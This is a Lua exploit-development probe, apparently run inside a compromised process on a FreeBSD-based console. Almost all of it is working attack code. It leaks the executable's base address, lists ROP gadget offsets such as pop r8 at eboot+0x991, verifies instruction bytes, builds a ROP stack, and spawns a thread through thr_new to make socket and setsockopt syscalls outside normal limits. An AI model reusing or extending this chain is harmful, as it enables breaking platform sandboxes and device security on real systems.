-- CRASH_CLASS: LOW
-- PROBE 396f: verify pop_r8;ret gadget + 5-arg child syscall
--
-- gen_fcall_chain revealed pop_r8;ret at eboot+0x991 (one byte before pop_rax;ret).
-- Verify: child calls setsockopt(fd, SOL_TCP=6, TCP_NODELAY=1, &val, 4) via ROP
-- with R8 = optlen = 4. Also test from main thread with proper pointer args.
--
-- Additionally test setsockopt from main thread to diagnose the -1 returns.

print("=== PROBE 396f: pop r8 + 5arg ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

-- Gadgets (including NEW pop_r8)
local pop_rax_ret = g(0x992)
local pop_r8_ret  = g(0x991)   -- NEW: pop r8; ret (misaligned, 1 byte before pop_rax)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local pop_rsp_ret = g(0x9A2)

-- First: verify the byte at +0x991 is actually 0x41 (REX.B prefix for pop r8)
local b991 = rd(eb_lo + 0x990)  -- read dword starting at +0x990
local b993 = rd(eb_lo + 0x994)
print(string.format("bytes@990=%08X @994=%08X", b991 or 0, b993 or 0))
-- Expected at +0x990: xx 41 58 C3 (unknown, REX.B, pop rax opcode, ret)
-- +0x991 = 41, +0x992 = 58, +0x993 = C3
-- So dword at +0x990: C3584100 (little-endian) or similar

-- SIGSYS ignore
local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- =======================================================
-- PART A: Test setsockopt from main thread with proper args
-- =======================================================
print("")
print("-- MAIN THREAD SETSOCKOPT --")

-- Create TCP socket
local ok_s, rv_s = pcall(function()
    return mk(97)(uint64(2), uint64(1), uint64(0))
end)
local tcp_fd = ok_s and N(rv_s) or -1
print(string.format("tcp_fd=%d", tcp_fd))

if tcp_fd >= 0 then
    -- Buffer with value=1 for TCP_NODELAY
    local optbuf = memory.alloc(16)
    wd(N(optbuf), 1)
    wd(N(optbuf) + 4, 0)

    -- Test via native.fcall_with_rax — this only controls RAX, not all regs
    -- Not useful for setsockopt since it needs 5 args in regs

    -- Test via the setsockopt syscall table (which uses gen_fcall_chain)
    -- The chain should handle all args including R8
    local ok1, rv1 = pcall(function()
        return syscall.setsockopt(uint64(tcp_fd), uint64(6), uint64(1),
            uint64(N(optbuf)), uint64(4))
    end)
    print(string.format("native_so: ok=%s ret=%s", tostring(ok1), tostring(rv1)))
    if ok1 then print("  N(ret)=" .. N(rv1)) end

    -- Try with memory object directly (not N() converted)
    local ok2, rv2 = pcall(function()
        return syscall.setsockopt(uint64(tcp_fd), uint64(6), uint64(1),
            optbuf, uint64(4))
    end)
    print(string.format("native_so_memobj: ok=%s ret=%s", tostring(ok2), tostring(rv2)))
    if ok2 then print("  N(ret)=" .. N(rv2)) end

    -- Try make_syscall with the buffer as uint64 of its address
    local ok3, rv3 = pcall(function()
        return mk(105)(uint64(tcp_fd), uint64(6), uint64(1),
            uint64(N(optbuf)), uint64(4))
    end)
    print(string.format("mk105_uint64: ok=%s", tostring(ok3)))
    if ok3 then print("  N(ret)=" .. N(rv3)) end

    -- getsockopt to check if nodelay was actually set
    local glenp = memory.alloc(8)
    wq(glenp, uint64(4))
    local gbuf = memory.alloc(16)
    wd(N(gbuf), 0xCC)
    local ok4, rv4 = pcall(function()
        return mk(118)(uint64(tcp_fd), uint64(6), uint64(1),
            uint64(N(gbuf)), uint64(N(glenp)))
    end)
    local gval = rd(N(gbuf))
    local glen = rd(N(glenp))
    print(string.format("getsockopt: ok=%s val=%X len=%d", tostring(ok4), gval or 0xCC, glen or 0))

    pcall(function() mk(6)(uint64(tcp_fd)) end)
end

-- =======================================================
-- PART B: Test pop_r8;ret from child thread
-- =======================================================
print("")
print("-- CHILD pop_r8 test --")

-- Child will: write the value popped into R8 into shared memory
-- Chain: pop_r8 → pop_rax (to move R8 value somewhere readable)
-- Problem: can't directly read R8. But we can use it as an arg.
-- Test: child calls write(fd, &byte, count) where count comes from R8.
-- Or simpler: child calls getpid with R8 set, and we just verify it doesn't crash.

-- Simplest test: pop_r8;ret + thr_exit
-- If the child survives, pop_r8 decoded correctly.
local shared = memory.alloc(0x20)
for i = 0, 0x1C, 4 do wd(N(shared) + i, 0) end
local marker_a = N(shared)

local tcb_buf = memory.alloc(0x10000)
for i = 0, 0xFFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x8000
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local BUF_SIZE = 0x10000
local stk = memory.alloc(BUF_SIZE)
for i = 0, BUF_SIZE - 4, 4 do wd(N(stk) + i, 0) end
local stk_base = N(stk)
local NOMINAL_SIZE = 0x100
local rsp = ((stk_base + NOMINAL_SIZE) - ((stk_base + NOMINAL_SIZE) % 16)) - 8

local sp = rsp
local function push(val) wq(sp, val); sp = sp + 8 end

-- sysarch(SET_FSBASE)
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- pop_r8 with a known value (0xDEAD)
push(pop_r8_ret); push(uint64(0xDEAD))

-- Now make a 5-arg syscall: write(fd, buf, count, ?, offset_from_r8)
-- Actually, let's use socketpair which is 4 args — we already know it works.
-- For a true 5-arg test: setsockopt(fd, SOL_SOCKET=0xFFFF, SO_RCVBUF=0x1002, &val, 4)

-- Create a socket first: socket(AF_INET=2, SOCK_STREAM=1, 0) = 3 args
push(pop_rax_ret); push(uint64(97))
push(pop_rdi_ret); push(uint64(2))
push(pop_rsi_ret); push(uint64(1))
push(pop_rdx_ret); push(uint64(0))
push(stub)
-- RAX now has fd

-- Store the fd at marker_a (to verify socket worked)
push(pop_rdi_ret); push(uint64(marker_a))
push(mov_rdi_rax)

-- Now: setsockopt(fd, 6, 1, &optval, 4)
-- Need: RDI=fd, RSI=6, RDX=1, RCX=&optval, R8=4
-- Problem: fd is in RAX from socket call, need it in RDI.
-- We already wrote it to marker_a. Read it back?
-- Actually, just hardcode a known fd number. The socket will likely be fd 23.
-- Or use the stored value.

-- Actually, let's prepare optval buffer
local child_optbuf = memory.alloc(16)
wd(N(child_optbuf), 1)  -- optval = 1 (enable TCP_NODELAY)

-- For setsockopt we need the fd in RDI. The socket return is in RAX.
-- We can: push the fd from RAX to a temp address, then load it into RDI
-- Store fd to temp
local fd_temp = memory.alloc(8)
push(pop_rdi_ret); push(uint64(N(fd_temp)))
push(mov_rdi_rax)  -- fd_temp = socket_fd

-- Now load args for setsockopt:
-- RDI = fd (we need to read from fd_temp, but we don't have a "load RDI from memory" gadget)
-- Simplest: just use fd=23 (the likely fd number)
-- Or: we have mov rax, [rax]; ret at eboot+... let me check the chain output:
-- 0x41eeebb: mov rax, [rax]; ret
-- So we can: pop_rax → fd_temp_addr, then mov rax,[rax] → rax=fd, then... need rax→rdi

-- Actually we don't have mov rdi, rax. We have mov [rdi], rax (store, not register move).
-- We need a different approach.

-- Simplest: hardcode fd. Socket is likely the next available fd after existing ones.
-- In a fresh probe, fds 0-22 are likely taken, socket gets 23.
-- Let's just use 23. If wrong, setsockopt fails but doesn't crash.

push(pop_rax_ret); push(uint64(105))   -- setsockopt syscall
push(pop_rdi_ret); push(uint64(23))    -- fd (assumed)
push(pop_rsi_ret); push(uint64(6))     -- IPPROTO_TCP
push(pop_rdx_ret); push(uint64(1))     -- TCP_NODELAY
push(pop_rcx_ret); push(uint64(N(child_optbuf)))  -- &optval
push(pop_r8_ret);  push(uint64(4))     -- optlen = 4
push(stub)

-- Store setsockopt return to marker_a+8
push(pop_rdi_ret); push(uint64(marker_a + 8))
push(mov_rdi_rax)

-- write marker to confirm chain completed
push(pop_rdi_ret); push(uint64(marker_a + 16))
push(pop_rax_ret); push(uint64(0xCAFE))
push(mov_rdi_rax)

-- thr_exit
push(pop_rax_ret); push(uint64(431))
push(pop_rdi_ret); push(uint64(0))
push(stub)

print(string.format("chain=%d bytes", sp - rsp))

local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 8, 0, 0)
w64(N(pa) + 0x10, stk_base % 0x100000000, math.floor(stk_base / 0x100000000))
w64(N(pa) + 0x18, NOMINAL_SIZE, 0)
local ctid = memory.alloc(8)
w64(N(ctid), 0, 0)
w64(N(pa) + 0x30, N(ctid) % 0x100000000, math.floor(N(ctid) / 0x100000000))

print("launch")
local ok_t, rv_t = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
local tret = ok_t and N(rv_t) or -999
print(string.format("thr=%d", tret))

local dummy = 0
for i = 1, 500000 do dummy = dummy + 1 end

-- Read results
local sock_fd = rd(marker_a) or -1
local so_ret_lo = rd(marker_a + 8) or 0xDEAD
local so_ret_hi = rd(marker_a + 12) or 0
local done_mark = rd(marker_a + 16) or 0

print(string.format("child_socket_fd=%d", sock_fd))
print(string.format("child_setsockopt=%08X_%08X", so_ret_hi, so_ret_lo))
print(string.format("done=%04X (expect CAFE)", done_mark))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 396f COMPLETE ===")
